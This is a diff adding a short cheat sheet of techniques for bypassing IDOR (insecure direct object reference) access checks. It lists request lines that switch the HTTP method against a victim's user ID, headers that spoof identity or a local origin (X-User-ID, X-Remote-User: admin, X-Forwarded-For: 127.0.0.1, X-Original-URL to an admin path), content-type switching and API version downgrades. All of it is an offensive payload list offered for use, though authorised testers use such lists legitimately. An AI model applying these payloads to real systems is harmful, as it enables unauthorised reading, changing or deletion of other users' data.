@@ -1,0 +1,21 @@
+# IDOR Bypass via Headers & Methods
+
+# HTTP Method Overriding
+POST /api/user/VICTIM_ID (Try changing GET to POST/PUT/DELETE)
+PUT /api/user/VICTIM_ID
+DELETE /api/user/VICTIM_ID
+
+# Header-Based Identity Spoofing
+X-User-ID: VICTIM_ID
+X-Remote-User: admin
+X-Forwarded-For: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Original-URL: /admin/user/VICTIM_ID
+
+# Content-Type Switching
+# Change application/json to application/xml or application/x-yaml
+# To see if the backend parser has weaker auth checks for different formats.
+
+# Version Downgrading
+/api/v2/user/VICTIM_ID -> /api/v1/user/VICTIM_ID
+/api/v3/user/VICTIM_ID -> /api/beta/user/VICTIM_ID
